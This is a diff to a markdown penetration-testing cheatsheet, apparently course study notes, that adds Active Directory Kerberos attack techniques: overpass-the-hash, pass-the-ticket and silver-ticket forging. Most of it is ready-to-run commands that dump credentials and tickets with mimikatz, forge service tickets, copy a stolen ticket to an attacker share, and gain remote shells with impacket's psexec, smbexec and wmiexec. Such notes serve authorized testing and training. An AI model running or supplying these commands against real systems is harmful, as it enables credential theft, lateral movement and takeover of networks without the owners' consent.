@@ -208,6 +208,12 @@ Useful Powershell one-liners:
 Useful lateral movement techniques:
 * https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/
 
+Abusing Kerberos using Impacket:
+* https://www.hackingarticles.in/abusing-kerberos-using-impacket/
+
+Kerberos attack cheatsheet:
+* https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#kerberos-cheatsheet
+
 ### ZeroLogon Vulnerability
 
 Try Zerologon (requires reset after use as account pw is set to empty)
@@ -283,6 +289,8 @@ $ crackmapexec smb [target] -u [username] -H [hash] -x "whoami"
 * Requirement: user/service account to have local admin on target machine.
 * Useful when Kerberos is the only authentication mechanism allowed in a target (NTLM authN disabled).
 * `psexec.exe` requires local admin rights as it accesses admin$ share.
+
+OPTH via. COMPROMISED HOST
 ```powershell
 ### WITH MIMIKATZ ON COMPROMISED HOST
 mimikatz > sekurlsa::logonpasswords    # obtain NTLM hash
@@ -299,8 +307,10 @@ PS> klist # now should show TGT/TGS
 PS> .\PsExec.exe \\[computer] cmd.exe  # use TGT to perform code exec against
                                        # target which user has permissions on.
                                        # (as Psexec does not accept hashes)
+```
 
-### WITH IMPACKET ON KALI
+OPTH via. KALI
+```bash
 # Request the TGT with hash
 $ python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
 # Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
@@ -312,24 +322,72 @@ $ python getTGT.py <domain_name>/<user_name>:[password]
 # Set the TGT for impacket use
 $ export KRB5CCNAME=<TGT_ccache_file>
 
-# Execute remote commands with any of the following by using the TGT
+# execute remote commands with any of the following by using the TGT
 $ python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 $ python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 $ python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 ```
 
-### Pass-the-Ticket / Silver Ticket
-* In this attack, user/group permissions in a Service Ticket are blindly trusted by the application on a target server running in the context of the service account. We forge our own Service Ticket (Silver Ticket) to access the resource (e.g. IIS app, MSSQL app) with any permissions we want. If the SPN/service account is used across multiple servers, we can leverage our Silver Ticket against all.
-* By
-* Walkthrough of PTT via. compromised MSSQLSvc hash: https://stealthbits.com/blog/impersonating-service-accounts-with-silver-tickets/
+### Pass-the-Ticket
+* We authenticate as a user on a target host via. their Kerberos TGT rather than using their NTLM hash.
+
+PTT via. COMPROMISED HOST
+```powershell
+mimikatz> sekurlsa::tickets /export          # export tickets
+mimikatz> kerberos::ptt [ticket_name.kirbi]  # inject into memory
+cmd> psexec.exe \\target.hostname.com cmd    # authN to remote target using ticket
 ```
+
+PTT via. KALI
+```bash
+# export tickets -> copy to Kali
+mimikatz> sekurlsa::tickets /export                             
+cmd> copy [ticket.kirbi] \\192.168.119.XXX\share\[ticket.kirbi]
+
+# use ticket_converter.py to convert .kirbi to .ccache
+# https://github.com/Zer1t0/ticket_converter
+$ python ticket_converter.py ticket.kirbi ticket.ccache
+
+# Set the ticket for impacket use
+export KRB5CCNAME=<TGT_ccache_file_path>
+
+# Execute remote commands with any of the following by using the TGT
+python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+```
+
+### Silver Ticket
+* In this attack, user/group permissions in a Service Ticket are blindly trusted by the application on a target server running in the context of the service account. We forge our own Service Ticket (Silver Ticket) to access the resource (e.g. IIS app, MSSQL app) with any permissions we want. If the SPN/service account is used across multiple servers, we can leverage our Silver Ticket against all.
+* Walkthrough of PTT via. compromised MSSQLSvc hash: https://stealthbits.com/blog/impersonating-service-accounts-with-silver-tickets/
+
+SILVER TICKET via. COMPROMISED HOST
+```powershell
 # obtain SID of domain (remove RID -XXXX) at the end of the user SID string.
 cmd> whoami /user
 corp\offsec S-1-5-21-1602875587-2787523311-2599479668[-1103]
 
-# generate the Silver Ticket and inject it into memory
+# generate the Silver Ticket (TGS) and inject it into memory
 mimikatz > kerberos::golden /user:[user_name] /domain:[domain_name] /sid:[sid_value] 
         /target:[service_hostname] /service:[service_type] /rc4:[hash] /ptt
+        
+# abuse Silver Ticket (TGS)
+cmd> psexec.exe -accepteula \\<remote_hostname> cmd   # psexec
+cmd> sqlcmd.exe -S [service_hostname]                 # if service is MSSQL
+```
+
+SILVER TICKET via. KALI
+```bash
+# generate the Silver Ticket with NTLM
+$ python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>
+
+# set the ticket for impacket use
+$ export KRB5CCNAME=<TGT_ccache_file_path>
+
+# execute remote commands with any of the following by using the TGT
+$ python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+$ python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+$ python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 ```
 
 ### Distributed Component Object Model (DCOM)
